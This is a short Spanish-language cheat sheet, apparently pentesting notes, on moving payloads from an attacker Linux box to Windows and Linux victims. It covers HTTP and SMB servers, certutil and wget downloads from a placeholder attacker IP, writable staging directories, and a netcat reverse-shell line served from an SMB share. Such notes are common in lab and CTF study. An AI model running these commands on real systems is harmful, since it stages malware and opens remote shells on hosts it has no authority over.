# Transferir archivos 

Tags: #FileTransfer #LinuxtoWindows #LinuxtoLinux 

## Linux a Windows 

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Windows 

C:\Temp
C:\Windows\Temp                          
```

```bash 
# Atacante Linux
2. ❯ python -m SimpleHTTPServer 80      # Creamos un servidor para poder pasar los archivos a la maquina Windows
3. ❯ python3 -m http.server 80          # Creamos un servidor 
4. ❯ impacket-smbserver smbFolder --smb2support
```

```bash 
# Victima Windows 

1. ❯ upload ~/Downloads/file.exe         # Funciona en la sesion de Meterpreter, colocando la ruta absoluta del archivo a subir

2. ❯ certutil -urlcache -f http://IP/payload.exe payload.exe                  # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
	
3. ❯ certutil.exe -f -urlcache -split http://IP/payload.exe payload.exe       # Para descargar el payload de la maquina Linux
	# IP = Direccion de la maquina de atacante Linux
	# payload.exe = Nombre del archivo a descargar en la maquina Windows 

4. \\\\<IP>\\smbFolder\\nc.exe -e cmd <IP> 443 
```

## Linux a Linux

```bash 
# Directorios en donde tienes los permisos de lectura y escritura en Linux 

/var/tmp 
/dev/shm
```

```bash
# Atacante Linux

1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
```

```bash 
# Victima Linux

1. ❯ wget http://IP/payload.exe         # Para descargar el payload de la maquina Linux
```